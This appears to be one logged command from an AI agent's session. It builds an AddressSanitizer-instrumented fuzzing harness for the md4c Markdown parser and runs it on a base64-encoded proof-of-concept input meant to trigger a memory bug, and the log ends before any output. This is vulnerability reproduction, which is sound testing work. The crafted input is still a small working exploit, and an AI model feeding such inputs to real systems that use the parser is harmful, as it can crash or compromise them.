Running command: cd /workspace && bash build.sh 'cat > /tmp/harness.c << "EOF"
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include "md4c-html.h"
static void process_output(const MD_CHAR* text, MD_SIZE size, void* userdata) { return; }
int main(int argc, char** argv) {
    if(argc < 2) { fprintf(stderr, "usage: %s <file>\n", argv[0]); return 1; }
    FILE* f = fopen(argv[1], "rb");
    if(!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* data = malloc(sz);
    if(!data) { perror("malloc"); return 1; }
    fread(data, 1, sz, f);
    fclose(f);
    if(sz < 8) { free(data); return 0; }
    unsigned parser_flags = ((unsigned*)data)[0];
    unsigned renderer_flags = ((unsigned*)data)[1];
    md_html(data + 8, sz - 8, process_output, NULL, parser_flags, renderer_flags);
    free(data);
    return 0;
}
EOF
cd /gt/_work/src && clang -g -fsanitize=address -I src /tmp/harness.c src/md4c.c src/entity.c src/md4c-html.c -o /tmp/harness 2>&1 | tail -5
echo "IP//ICAgICD/DS18DT5bIW5PVGVdCj7/" | base64 -d > /tmp/poc3.bin
echo "=== Running harness ==="
/tmp/harness /tmp/poc3.bin 2>&1 | head -80
echo "EXIT: $?"'

